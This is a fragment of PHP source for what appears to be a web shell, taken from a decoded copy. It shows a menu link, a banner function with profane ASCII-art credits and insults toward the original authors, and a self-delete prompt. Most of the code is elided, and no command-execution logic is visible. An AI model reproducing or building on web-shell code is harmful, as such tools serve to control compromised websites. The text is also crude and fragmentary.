...
/**
 * @author I just don't fucking know him
 * @copyright 2012 -- As i give a shit .!.
 */
@define('VERSION','1.0');
...
<li><a href="#" onclick="g(\'spot\',null,\'\',\'\',\'\')">Open Source</a></li>
...
function madspot()
{
 ...
 (             ````----....|___   |
  \     _                      ````----....____
   \    _)  DeCoded By: m4gnumsnip3r           ```---.._                       
    \                                                   \ 
  )`.\  )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )hh
-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `
   I am just a fukin n00b from India. Since few days I am into shit called Web Haxing
   I don't have any fuckin experience nor knowledge. It was just that I hated backdoored shells and encoded shits. 
   That's why I decoded it. 
   Sorry developers, I can't rely on you. If you are sad then take this ----> .!. and shove it up your asses.
   Greets to all Indians
   Version 1.0  ( No worries. I will also decode future versions )
   
   Contact : m4gnumsnip3r@gmail.com
   
   If you found bug then do not contact  me. I am not a fuckin php developer. <br>
   Below are the dickheads who created this shit and encoded it. I fuckin decode it. You might want to thank them as well.
           ...
           ,/'-=\/=-'\,
          / /        \ \     -----------------------------
         | / Chutium  \ |    Stolenscript Digital Security Team
         \/ \Sulphate/ \/    -----------------------------
             '.    .'
             _|`~~`|_
             /|\  /|\    
 ...
 /    Dick1    \    /        \     /'-___-'\    /    :|    \
(_)     .     (_)  /   Dick   \   /  Dick 3 \  (_)   :|   (_)
 \_-----'____--/  (_)    2   (_) (_)_______(_)   |___:|____|
  \___________/     |________|     \_______/     |  Dick 4 |
...
";
    ...
    echo '<br>Kill Me? Click me and I will fuck your system as well.<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
	madFooter();
